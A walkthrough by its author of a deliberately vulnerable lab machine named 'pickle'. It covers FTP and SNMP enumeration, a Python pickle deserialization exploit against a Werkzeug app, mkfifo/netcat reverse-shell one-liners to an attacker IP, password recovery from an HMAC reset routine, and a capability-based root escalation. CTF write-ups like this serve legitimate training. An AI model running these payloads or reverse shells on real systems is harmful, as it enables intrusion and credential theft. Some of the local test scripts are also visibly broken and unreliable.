Today I present to you the machine I created, it is relatively simple and a good reading of the Python code will help you how it works.

The SNMP port was found which works in public, we will analyze this later and the same for the `FTP`. 

# FTP

We can see in the FTP server there is a file named "`init.py.bak`", download it with the ftp command. 

    # ftp 192.168.0.44

This is probably an old backup file, when we open the file it probably looks like the Werkzeug server for port `1337`, we will be interested in this for later.

# SNMP 

SNMP can be publicly accessible, so let's use the snmpwalk command to find out more about this service. If you don't know what `SNMP` is, don't hesitate to check Google. To put it simply, it is simply a protocol that manages network equipment to monitor and diagnose network and hardware problems remotely.

We have found the crendential, we can connect to the Werkzeug service. The python script in the `FTP` server will allow us to continue our journey in this boxing. 

# Warkzeug HTTPd

There are only 3 sections, HOME, CHECK and RESET. The CHECK and RESET sections only return "Server Error!"
The paths are also in the Python code. But there is only `/checklist` and the `(/)`. It is missing /reset because it is probably a backup file and it is not the main file. We can see the path redirects in the Python code. 

    @app.route('/', methods=["GET", "POST"]) 
    [...SNIP...] 
    @app.route('/checklist', methods=["GET", "POST"]) 

If we take a closer look at the `index_page()` function, it performs actions if we try to send a message to the Werkzeug server. 

    @app.route('/', methods=["GET", "POST"]) 
    def index_page(): 
        if request.method == "POST" and request.form["story"] and request.form["submit"]: 
        md5_encode = hashlib.md5(request.form["story"]).hexdigest() 
        paths_page = "/opt/project/uploads/%s.log" %(md5_encode) 
        write_page = open(paths_page, "w") 
        write_page.write(request.form["story"]) 
    return "The message was sent successfully!" 

First, there is a condition that tests if this is the correct method (POST) and also tests if the [story] and [submit] parameter exist. The [story] parameter corresponds to the message we send. 

    if request.method == "POST" and request.form["story"] and request.form["submit"] 

So concretely it encrypts the message we send in MD5 and it puts it in a variable named md5_encode. 

    md5_encode = hashlib.md5(request.form["story"]).hexdigest() 
    
Here, in concrete terms, it retrieves our message, encrypts it in MD5, and will create a file with the MD5. 

    paths_page = "/opt/project/uploads/%s.log" %(md5_encode) 
    
Here we can see that the code will create a file in the uploads/ folder and it will write our message to the file. 

    write_page = open(paths_page, "w") 
    write_page.write(request.form["story"]) 

We will now study the check_page() function. First, we can observe that the condition tests the method if it is in POST and also tests if the check parameter exists. 

    if request.method == "POST" and request.form["check"] 

Here it seems to point to an MD5 file in the uploads/ folder. It will probably try to open this file. 

    path_page = "/opt/project/uploads/%s.log" %(request.form["check"]) 

If we enter the encrypted MD5 file, we can open it with the check parameter. 

    open_page = open(path_page, "rb").read() 
    
Pickle will pickle each of these pieces separately, and then on unpickling, will call the callable on the provided arguments to construct the new object. And so, we can construct a pickle that, when un-pickled, will execute command. (Good link here)

    open_command = pickle.loads(open_page) 
    
Here it tests if there is p1 value in the file if there is not p1 value in the file, it will open the file. 

    if("p1" in open_command) 
        return str(open_command) 
    else 
        return open_page 

# Exploitation 

We have seen that the check_page() function loads a file, and if we do some data deserialization we can execute a command. If you don't understand, read an article here. 

We will first do a little serialization and file reading test to better understand the context. If for example I want to read the message I sent. I need to encrypt the message in MD5 first, let's use Python for that.

    >>> import hashlib 
    >>> message = "hello" 
    >>> print(hashlib.md5(message).hexdigest()) 
    5d41402abc4b2a76b9719d911017c592 

If now in the text field I write "hello" and now try to use the /checklist function, I can perfectly read my message which saved in the remote server. 

    # curl -u 'lucas:SuperSecretPassword123!' 'http://192.168.0.44:1337/checklist' -d "check=5d41402abc4b2a76b9719d911017c592" 
    hello 

Now we need to test with serialization to run commands. We need to create a Python script for this, get your keyboards ready. 

    #coding:utf-8 

    import os 
    import cPickle 
    import hashlib 
    import requests 
    class CommandExecute(object): 
        def __reduce__(self): 
            return (os.system, ('ping -c 2 192.168.0.17',)) 

    convert_data = cPickle.dumps(CommandExecute()) # The message that will be sent to the server with the command. 
    convert_crypt = hashlib.md5(convert_data).hexdigest() 
    send_requests = requests.post('http://192.168.0.44:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!")) 
    check_requests = requests.post('http://192.168.0.44:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!")) 
    print(check_requests.text) 

When we run the script, the server returns ICMP queries to us, so the command was successfully executed by the server. We are on the right track.

# Reverse Shell 

Let's change the script to do a reverse shell. I will be using a pentestmonkey command to do my reverse shell. 

    return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.17 9001 >/tmp/f',)) 

I tried the above command, and also tried other command like wget, but it didn't work, it doesn't accept TCP connections just 21 and 1337. I had to change the communication mode by doing a UDP reverse shell. I only added the -u option to specify that it is UDP mode. 

    return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 192.168.0.17 9001 >/tmp/f',)) 

Now we have to use the netcat command to listen to a port and especially not to forget the -u option to specify the UDP protocol. And if now, I run the script, the server returns a shell to me. 

    @app.route('/reset', methods=["GET", "POST"]) 
    @requires_auth 
    def reset_page(): 
        if request.method == "POST" and request.form["username"] and request.form["key"]: 
            key = "dpff43f3p214k31301" 
            raw = request.form["username"] + key + socket.gethostbyname(socket.gethostname()) 
            hashed = hmac.new(key, raw, hashlib.sha1) 
            if request.form["key"] == hashed.hexdigest(): 
                return base64.b64encode(hashed.digest().encode("base64").rstrip("\n")) 
            else: 
                return "Server Error!" 

We can see that there is a condition which tests if the method is POST and also tests if the username and key parameter exists. 

    if request.method == "POST" and request.form["username"] and request.form["key"] 

Then there is a key. 

    key = "dpff43f3p214k31301" 
    
Then concretely, it gets the user argument and merges it with the key and with the local IP address. 

    raw = request.form["username"] + key + socket.gethostbyname(socket.gethostname()) 
    
Then the script encrypts the raw variable with the key key which is stored in the hashed variable. 

    hashed = hmac.new(key, raw, hashlib.sha1) 

Then it tests if the key argument is equal to the variable hashed in hex . 

    if request.form["key"] == hashed.hexdigest()

If the key is equal it encodes this in base64, we can probably recover the password for user mark and lucas. 

    return base64.b64encode(hashed.digest().encode("base64").rstrip("\n") 

We need to do local testing to better understand the system. I completely copy the function and paste this into my python file. 

    import hashlib 
    import requests 
    import socket 
    import base64 
    import hmac 
    
    key = "dpff43f3p214k31301" 
    raw = user["lucas"] + key + socket.gethostbyname(socket.gethostname()) 
    hashed = hmac.new(key, raw, hashlib.sha1) 
    if(key[hashed.hexdigest()] == hashed): 
        print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))) 

And if we run we see that we have lucas password. 

    root@0xEEX75:~/hackmyvm/pickle# python reset.py 
    YTdYYTB1cDFQOTBmeEFwclVXZVBpTCtmakx3PQ== # Luca's password 

Let's see if there is any user other than lucas in the target system. 
   
    lucas@pickle:/opt/project$ ls /home 
    lucas mark 

There is indeed mark, let's try with mark to get the password. 

    import hashlib 
    import requests 
    import socket 
    import base64 
    import hmac 

    key = "dpff43f3p214k31301" 
    raw = user["mark"] + key + socket.gethostbyname(socket.gethostname()) 
    hashed = hmac.new(key, raw, hashlib.sha1) 
    if(key[hashed.hexdigest()] == hashed): 
        print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))) 
        
And if we run we see that we have mark password. 

    # python reset.py 
    SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ== # Mark's password 
    
    lucas@pickle:/opt/project$ su - mark 
    Password: SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ== 
    mark@pickle:~$ cat user.txt 
    e25fd1[...SNIP...] 

# Mark > Root 

Root is not very complicated, just look for files that support the capabilities. 

    mark@pickle:~$ getcap -r / 2>/dev/null 
    /home/mark/python2 = cap_setuid+ep 
    /usr/bin/ping = cap_net_raw+ep 
    
You just need to run python and use the os module to run a command.
